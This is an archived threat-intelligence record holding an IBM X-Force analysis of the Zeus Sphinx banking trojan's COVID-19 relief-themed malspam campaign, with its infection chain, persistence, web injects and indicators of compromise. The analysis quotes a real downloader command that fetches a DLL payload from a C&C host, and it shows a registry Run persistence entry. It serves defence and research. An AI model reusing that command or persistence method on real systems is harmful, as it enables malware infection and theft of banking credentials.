{
    "id": "4c8e9e83-4fc7-4640-8f9d-be416d637365",
    "created_at": "2023-01-12T15:01:54.947086Z",
    "updated_at": "2025-03-27T02:11:33.878405Z",
    "deleted_at": null,
    "sha1_hash": "173ba88232cea190536b844c58ef9c04a2814438",
    "title": "2020-03-30 - Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy",
    "authors": "",
    "file_creation_date": "2022-05-28T01:23:41Z",
    "file_modification_date": "2022-05-28T01:23:41Z",
    "file_size": 2931783,
    "plain_text": "# Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy\n\n**[securityintelligence.com/posts/zeus-sphinx-trojan-awakens-amidst-coronavirus-spam-frenzy/](https://securityintelligence.com/posts/zeus-sphinx-trojan-awakens-amidst-coronavirus-spam-frenzy/)**\n\n[Malware March 30, 2020](https://securityintelligence.com/category/x-force/malware-threat/)\nBy [Amir Gandler co-authored by Limor Kessem 7 min read](https://securityintelligence.com/author/amir-tal/)\n\n\n-----\n\nThe recent months have created a new reality in the world as the novel coronavirus\npandemic spread from country to country raising concerns among people everywhere. With\nspammers and malware distributors already being accustomed to riding trending news, the\n[COVID-19 theme has been exploited thoroughly by a large variety of spam and malspam](https://exchange.xforce.ibmcloud.com/collection/Threat-Actors-Capitalizing-on-COVID-19-f812020e3eddbd09a0294969721643fe)\ncampaigns. It appears that this was a good time for Zeus Sphinx (AKA Zloader, Terdot) to\njoin the crowds and resurface after nearly three years of absence.\n\nWhile some Sphinx activity we detected trickled in starting December 2019, campaigns have\nonly increased in volume in March 2020, possibly due to a testing period by Sphinx’s\noperators. It appears that, taking advantage of the current climate, Sphinx’s operators are\nsetting their sights on those waiting for government relief payments. Current malspam\ncampaigns feature booby-trapped document files named “COVID 19 relief” and subject lines\nrelying on the same theme. Sphinx’s targets have not changed from its past configuration\nfiles as it continues to focus on banks in the US, Canada, and Australia.\n\nWhile the renewed Zeus Sphinx activity that IBM X-Force is seeing features a somewhat\nmodified variant of this malware, Zeus Sphinx is not new malware and this variant is only\nslightly different than the original. We will therefore go into some basic modifications that\nwere made in the variant we observed, mostly affecting its delivery and deployment on newly\ninfected devices, as well as its focus on the current pandemic.\n\n## COVID-19-Themed Maldoc Spam Delivery\n\nAlmost all malware campaigns nowadays use malicious document files (maldocs) to reach\npotential victims’ mailboxes. The Sphinx campaigns we have observed are also being\ndistributed via maldoc spam that takes advantage of the trending COVID-19 theme. Over the\npast three months, spammers everywhere are using the pandemic to spread phishing,\nscams and malware. In Sphinx’s case, the email tells victims that they need to fill out an\nattached form to receive monetary compensation for having to stay at home to help fight\nincreasing infection rates.\n\n\n-----\n\n_Figure 1: Malspam delivering a Zeus Sphinx infection (Source: IBM X-Force)_\n\nFrom a variety of Office programs, with the majority being .doc or .docx files, these\ndocuments at first request the end user to enable executing a macro, unknowingly triggering\nthe first step of the infection chain. Once the end user accepts and enables these malicious\nmacros, the script will start its deployment, often using legitimate, hijacked Windows\nprocesses that will fetch a malware downloader. Next, the downloader will communicate with\na remote command-and-control (C&C) server and fetch the relevant malware — in this case,\nthe new Sphinx variant.\n\nThe maldoc is password-protected, likely to prevent analysis of the file before the recipient\nopens it.\n\n_Figure 2: Maldoc file requires a password to open (Source: IBM X-Force)_\n\nIn the next step, the recipient is asked to enable macros.\n\n_Figure 3: Booby-trapped maldoc file asks user to enable macros (Source: IBM X-Force)_\n\nOnce on the device, Sphinx establishes persistence via commonly used methods to maintain\nits grasp on the end user’s machine. In this case, it writes numerous folders and files to disk\nand adds some Registry keys in order to hide itself and manage its configuration files over\ntime.\n\n\n-----\n\n## Deployment Method\n\nThe infection process of the new Zeus Sphinx variant starts off with the weaponized\ndocument that creates a malicious folder under %SYSTEMDRIVE% and writes a batch file\ninto it.\n\nAfter executing the batch file, it writes a VBS file to the same folder. That file is executed and\nuses a legitimate WScript.exe process, creates a communication channel with its C&C\nserver and downloads a malicious executable in the form of a DLL.\n\n_Figure 4: Sphinx scripts and junk text inserted into the file (Source: IBM X-Force)_\n\nThe command line is similar in several cases. As written in the VBS content file, this is an\nexample of the command:\n\n_“nologo C:\\Logs\\Jobs.vbs http://brinchil.xyz/MLrPSC C:\\Logs\\kofet.dll“_\n\n\n-----\n\nThe malicious DLL, which is Sphinx s executable, is also written to the folder under\n_%SYSTEMDRIVE%. The infection process is initiated with the execution of the Sphinx DLL_\nusing Regsvr32.exe, which sets off Sphinx’s infection chain.\n\nAt first, the malware creates a hollow process, msiexec.exe, and injects its code into it. This\nsame step was used by older versions of Sphinx for deployment. It creates the first folder\nunder %APPDATA% and creates an executable file in it. Later on, it will change the\nextension to .DLL for persistence purposes.\n\nIn addition, the malware adds over 10 other malicious folders containing various data files\nunder %APPDATA%.\n\n_Figure 5: Sphinx folders written into the APPDATA section (Source: IBM X-Force)_\n\nNext, the malware creates a run key in the Registry under\n_HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ with the path to the DLL set under_\n_%APPDATA% as a persistence method using Rundll32.exe and DllRegisterServer as an_\nargument. This will execute the DLL using the Regsrv32.exe process.\n\nFor example:\n\n**Key — HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Uffuehh**\n**Value — rundll32.exe**\nC:\\Users\\michel\\AppData\\Roaming\\Fecaa\\dagicoy.dll,DllRegisterServer\n\n\n-----\n\n_Figure 6: Zeus Sphinx’s run key (Source: IBM X-Force)_\n\nThe malware also creates two Registry hives under HKCU\\Software\\Microsoft\\, each one\ncontaining one key that holds a part of its configuration.\n\nPlease note that all file and resource names are dynamically generated for each infected\nmachine and not hardcoded; therefore, what’s shown in this blog are examples that will differ\non each deployment.\n\n## Self-Signed Certificate\n\nSphinx signs the malicious code using a digital certificate that validates it, making it easier for\nit to stay under the radar of common antivirus (AV) tools when injected to the browser\nprocesses. In the following example, that file is named “Byfehi.”\n\n_Figure 7: Sphinx’s self-signing certificate (Source: IBM X-Force)_\n\n## Zeus Web Injections Live On\n\n\n-----\n\nSome of Zeus Sphinx s origins, inherited from its Zeus v2 codebase, remain intact. There are\nseveral Zeus variants that operate in a similar way, writing resources to the %APPDATA%\nfolder and writing Registry key to HKCU\\Software\\Microsoft.\n\nTo carry out web injections, the malware patches explorer.exe and browser processes\n_iexplorer.exe/chrome.exe/firefox.exe but doesn’t have the actual capability of repatching itself_\nagain if that patch is fixed, which makes the issue less persistent and unlikely to survive\nversion upgrades.\n\nSphinx further creates a mutex on the injected process in the form of GUID – [0-9A-F]{12}-[0_9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{8}._\n\n## Malware Configuration\n\nThe Sphinx variant we looked at creates two Registry hives under\n_HKCU\\Software\\Microsoft\\, each containing one key that holds a part of its configuration._\n\nIn the example below, we can see this as HKCU\\Software\\Microsoft\\Ehobb and\n_HKCU\\Software\\Microsoft\\olyq._\n\n_Figure 8: Sphinx’s configuration file (Source: IBM X-Force)_\n\n### Current Targets\n\nOnce loaded and extracted from Sphinx’s process memory, it is visible that Sphinx is back to\ntargeting major banks in the U.S. and Canada. We are also seeing rising infection rates in\nAustralia targeting top banks in the region.\n\n## Fetch From Tables — A Commercial Web Inject Panel\n\n\n-----\n\nThe currently active Zeus Sphinx variant communicates with its C&C server using a webbased control panel for web injects. This platform is known as “Tables.”\n\n_Figure 9: “Tables” web interface — user login page (Source: IBM X-Force)_\n\nThe Tables web injects system has been operational since 2014, fitted for, and mostly used\nby, Zeus-type Trojans that target entities in North America and Europe.\n\nThis panel provides all the necessary resources for the malware to infect and collect relevant\ninformation from infected victims’ machines. Once a connection to the Tables panel has been\nestablished, Sphinx will fetch additional JavaScript files for its web injects to fit with the\ntargeted bank the user is browsing. Injections are all set up on the same domain with specific\nJS scripts for each bank/target.\n\n## About Zeus Sphinx\n\nZeus Sphinx initially emerged as a commercial banking Trojan that started selling and\n[spreading for the first time back in August 2015, targeting major financial entities in the U.K.](https://securityintelligence.com/uk-banks-hit-with-new-zeus-sphinx-variant-and-renewed-kronos-banking-trojan-attacks/)\n[Expanding its reach over time to attack banks in Australia, Brazil and North America,](https://securityintelligence.com/around-the-world-with-zeus-sphinx-from-canada-to-australia-and-back/)\nattackers deploying Sphinx attacks remained focused on the banking sector in those\ncountries, adapting their attacks to the local financial systems.\n\nAs a modular banking Trojan that’s based on the dated Zeus v2 code, Sphinx’s core\ncapability is to collect online account credentials from banks and a wide range of other\nwebsites. It calls on its C&C server to fetch relevant web injections when infected users land\non a targeted page and uses them to modify the pages users are browsing to include social\nengineering content and trick them into divulging personal information and authentication\ncodes.\n\nWant to keep up to date about Sphinx and emerging threat intelligence? Join us on IBM X[Force Exchange and read our research blogs on Security Intelligence.](https://securityintelligence.com/category/x-force/)\n\n## Indicators of Compromise (IoCs)\n\n\n-----\n\n### Maldoc\n\nDFF2E1A0B80C26D413E9D4F96031019CE4567607E0231A80D0EE0EB1FCF429FE\n\n### Samples\n\nVBS sample: 2FC871107D46FA5AA8095B78D5ABAB78\n\nSphinx samples:\n\nC8DFF758FEB96878F578ADF66B654CD7\n\n70E58943AC83F5D6467E5E173EC66B28\n\n7CA44F6F8030DF33ADA36EB35649BE71\n\n8A96E96113FB9DC47C286263289BD667\n\nC6D279AC30D0A60D22C4981037580939\n\n### IPs\n\n104.27.179.176\n\n104.27.178.176\n\n185.14.29.227\n\n[49.51.161.225](https://www.virustotal.com/gui/ip-address/49.51.161.225)\n\n[47.254.174.129](https://www.virustotal.com/gui/ip-address/47.254.174.129)\n\n### C&C Servers\n\nDownloader C&C: hxxp://brinchil.xyz\n\nSphinx C&Cs:\n\nhxxps://seobrooke[.com]\n\nhxxps://securitysystemswap[.com]\n\nhxxps://axelerode[.club]\n\n[Amir Gandler](https://securityintelligence.com/author/amir-tal/)\nThreat Researcher, IBM Trusteer\n\n\n-----\n\nI have a B.Sc. in Industrial Engineering and been working in the field of cyber security for 6\nyears. Started working at RSA and moved on to Trusteer (IBM S...\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-03-30 - Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy.pdf"
    ],
    "report_names": [
        "2020-03-30 - Zeus Sphinx Trojan Awakens Amidst Coronavirus Spam Frenzy.pdf"
    ],
    "threat_actors": [
        {
            "id": "e90ec9cb-9959-455d-b558-4bafef64d645",
            "created_at": "2022-10-25T16:07:24.222081Z",
            "updated_at": "2025-03-27T02:02:10.14365Z",
            "deleted_at": null,
            "main_name": "Sphinx",
            "aliases": [
                "APT-C-15"
            ],
            "source_name": "ETDA:Sphinx",
            "tools": [
                "AnubisSpy",
                "Backdoor.Oldrea",
                "Bladabindi",
                "Fertger",
                "Havex",
                "Havex RAT",
                "Jorik",
                "Oldrea",
                "PEACEPIPE",
                "njRAT",
                "yellowalbatross"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535714,
    "ts_updated_at": 1743041493,
    "ts_creation_date": 1653701021,
    "ts_modification_date": 1653701021,
    "files": {
        "pdf": "https://archive.orkl.eu/173ba88232cea190536b844c58ef9c04a2814438.pdf",
        "text": "https://archive.orkl.eu/173ba88232cea190536b844c58ef9c04a2814438.txt",
        "img": "https://archive.orkl.eu/173ba88232cea190536b844c58ef9c04a2814438.jpg"
    }
}